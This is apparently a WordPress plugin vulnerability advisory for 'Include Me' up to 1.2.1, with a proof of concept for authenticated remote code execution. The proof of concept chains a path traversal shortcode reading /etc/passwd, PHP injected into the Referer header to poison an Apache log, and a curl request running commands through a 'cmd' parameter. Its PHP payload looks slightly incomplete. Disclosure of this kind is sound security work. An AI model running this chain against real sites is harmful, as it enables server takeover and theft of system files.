## WordPress Plugin Vulnerabilities

# Include Me <= 1.2.1 - Authenticated Remote Code Execution (RCE) via LFI log poisoning

### Description

The plugin is vulnerable to path traversal / local file inclusion, which can lead to Remote Code Execution (RCE) of the system due to log poisoning and therefore potentially a full compromise of the underlying structure

### Proof of Concept

# RCE through chaining LFI with log poisoning
# 1. Path Traversal / Local File Inclusion
# Authenticate as any user, which can create blog posts on wordpress
# for example, user with "author" role
# create a new wordpress blog post
# copy paste the following content on your blog post and visit your newly created page:
[includeme file="/../../../../etc/passwd" value="This is a basic path traversal poc"]
# contents of /etc/passwd will be displayed
# 2. log poisoning
# PoC was constructed with the LAMPP stack on Ubuntu 20.04 LTS. LAMPP has the apache2 error log file under /opt/lampp/logs/error\_log, which will be used for demonstration purpose
# however, please note that the default apache2 log can be found under /var/log/apache2/access.log
# if you don't use the LAMPP stack, please use /var/log/apache2/access.log for the log poisoning part
# reference: https://www.hackingarticles.in/apache-log-poisoning-through-lfi/
# First, we are trying to open a restricted file like /etc/shadow to get an entry on /opt/lampp/logs/error\_log. The "error\_log" file is reflecting the HTTP "referrer" header, therefore we can inject arbitrary PHP functions into the "referrer" to get Remote Code Execution
# open Burp Suite to intercept the request, append the payload to the "referrer" field
# payload (without the quotes): ";<?php $\_GET['cmd'];?>"

# on the same blog post, change the file back to
[includeme file="../../../../opt/lampp/logs/error\_log" value="test"]
# now, the GET parameter "cmd" can be used to execute system commands
# append "?cmd=id" to the URL of your published blog post
# for example:
$ curl http://localhost/wordpress/2021/06/20/myblogpost/?cmd=id
